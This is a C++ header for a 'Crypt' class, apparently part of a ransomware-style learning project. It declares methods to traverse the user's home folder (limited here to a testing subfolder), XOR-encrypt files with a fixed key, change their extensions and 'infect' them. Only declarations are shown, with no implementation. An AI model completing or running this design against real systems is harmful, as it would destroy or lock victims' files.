#pragma once
#include "Recon.h"
#include <filesystem>
#include <fstream>
#include <iostream>
#include <minwindef.h>
#include <string>
#include <vector>
#include <Windows.h>

namespace fs = std::filesystem;

class Crypt {
private:
	Recon recon;
	char key = 0x33;
	std::wstring startingPath = recon.getHomeFolder() + L"\\testing";
	//std::wstring startingPath = recon.getHomeFolder();
	VOID traverseDirectory(const std::wstring& folderPath); 
	VOID XORCryptFile(const fs::directory_entry& file);
	VOID changeExtension(const fs::directory_entry& file);
	VOID infectFile(const fs::directory_entry& file);
	std::vector<char> encryptBytes(const fs::directory_entry& file);
public:
	Crypt();
	VOID startCrypt();
	//VOID XORCrypt(const fs::directory_entry& file);
	//std::vector<char> encrypt_bytes(const fs::directory_entry& file);
};